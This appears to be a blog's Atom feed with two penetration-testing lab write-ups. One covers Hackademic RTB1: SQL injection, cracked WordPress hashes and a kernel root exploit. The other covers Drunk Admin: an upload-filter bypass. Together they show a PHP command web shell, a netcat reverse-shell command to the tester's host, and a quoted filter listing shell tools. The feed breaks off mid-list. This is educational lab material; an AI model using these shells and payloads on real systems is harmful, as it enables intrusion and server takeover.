<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-07-18T12:57:26-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
    <updated>2016-07-18T09:00:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<!-- more -->


<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-web.png" title="hackademic" alt="hackademic website"></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-sqli.png" title="sqli" alt="sql error"></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
</span><span class='line'>available databases [3]:
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] wordpress</span></code></pre></td></tr></table></div></figure>


<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
</span><span class='line'>Database: wordpress
</span><span class='line'>[9 tables]
</span><span class='line'>+-------------------+
</span><span class='line'>| wp_categories     |
</span><span class='line'>| wp_comments       |
</span><span class='line'>| wp_linkcategories |
</span><span class='line'>| wp_links          |
</span><span class='line'>| wp_options        |
</span><span class='line'>| wp_post2cat       |
</span><span class='line'>| wp_postmeta       |
</span><span class='line'>| wp_posts          |
</span><span class='line'>| wp_users          |
</span><span class='line'>+-------------------+</span></code></pre></td></tr></table></div></figure>


<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user_pass                user_login
</span><span class='line'>21232f297a57a5a743894a0e4a801fc3  NickJames
</span><span class='line'>b986448f0bb9e5e124ca91d3d650f52c  JohnSmith
</span><span class='line'>7cbb3252ba6b7e9c422fac5334d22054  GeorgeMiller
</span><span class='line'>a6e514f9486b83cb53d8d932f9a04292  TonyBlack
</span><span class='line'>8601f6e1028a8e8a966f6c33fcd9aec4  JasonKonnors
</span><span class='line'>50484c19f1afdaf3841a0d821ed393d2  MaxBucky</span></code></pre></td></tr></table></div></figure>


<p>Cracking the hashes revealed the passwords of all the users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin
</span><span class='line'>PUPPIES
</span><span class='line'>q1w2e3
</span><span class='line'>napoleon
</span><span class='line'>maxwell
</span><span class='line'>kernel</span></code></pre></td></tr></table></div></figure>


<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-panel.png" title="dashboard" alt="admin panel"></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-404.png" title="404.php" alt="php file edited"></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
</span><span class='line'>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
</span><span class='line'> 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=489(apache) groups=489(apache)
</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ ./rds
</span><span class='line'>./rds
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Overwriting function pointer...
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Overwriting function pointer...
</span><span class='line'>[*] Triggering payload...
</span><span class='line'>[*] Restoring function pointer...
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root)
</span><span class='line'>cat /root/key.txt
</span><span class='line'>Yeah!!
</span><span class='line'>You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
</span><span class='line'>
</span><span class='line'>$_d&jgQ&gt;&gt;ak\#b"(Hx"o&lt;la_%
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>mr.pr0n || p0wnbox.Team || 2011
</span><span class='line'>http://p0wnbox.com</span></code></pre></td></tr></table></div></figure>


<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Don't relax! It's only your tension \
</span><span class='line'>\ that's holding you together.        /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
    <updated>2016-06-12T11:51:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<!-- more -->


<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
</span><span class='line'>8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))</span></code></pre></td></tr></table></div></figure>


<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/tripios.png" title="tripios" alt="tripios image hosting"></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/upload.png" title="upload" alt="uploaded image"></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nc -vvnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
</span><span class='line'>ls /home
</span><span class='line'>bob
</span><span class='line'>ls /home/bob/
</span><span class='line'>Documents
</span><span class='line'>public_html</span></code></pre></td></tr></table></div></figure>


<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -a /var/www
</span><span class='line'>.
</span><span class='line'>..
</span><span class='line'>.htaccess
</span><span class='line'>.proof
</span><span class='line'>image.php
</span><span class='line'>images
</span><span class='line'>index.php
</span><span class='line'>info.php
</span><span class='line'>myphp.php
</span><span class='line'>style
</span><span class='line'>upload.php
</span><span class='line'>xmm.html</span></code></pre></td></tr></table></div></figure>


<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .proof
</span><span class='line'>#########################
</span><span class='line'># Drunk Admin Challenge #
</span><span class='line'>#     by @anestisb    #
</span><span class='line'>#########################
</span><span class='line'>
</span><span class='line'>bob&gt; Great work.
</span><span class='line'>bob&gt; Meet me there.
</span><span class='line'>...&gt; ?
</span><span class='line'>bob&gt; What? You don't know where?
</span><span class='line'>bob&gt; Work a little more your post
</span><span class='line'>     exploitation skills.
</span><span class='line'>
</span><span class='line'>Secret Code:
</span><span class='line'>TGglMUxecjJDSDclN1Ej
</span><span class='line'>
</span><span class='line'>Mail me your methods at:
</span><span class='line'>anestis@bechtsoudis.com</span></code></pre></td></tr></table></div></figure>


<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /home/bob/public_html
</span><span class='line'>encrypt.php
</span><span class='line'>include
</span><span class='line'>index.php</span></code></pre></td></tr></table></div></figure>


<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/secret.png" title="secret" alt="secret decryption"></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
</span><span class='line'>
</span><span class='line'><span class="n">testme</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Enter string to check if base64: &quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[x] Sorry, this isn&#39;t base64&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/location.png" title="meeting location" alt="secret location"></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$errors</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;bash&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;sh -c&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;python&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;nc &quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;netcat&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;base64&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;ruby&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;fsockopen&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;xterm&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;gcc&quot;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_GET&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_POST&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_SERVER&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_FILES&#39;</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_COOKIE&#39;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm ./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">die</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
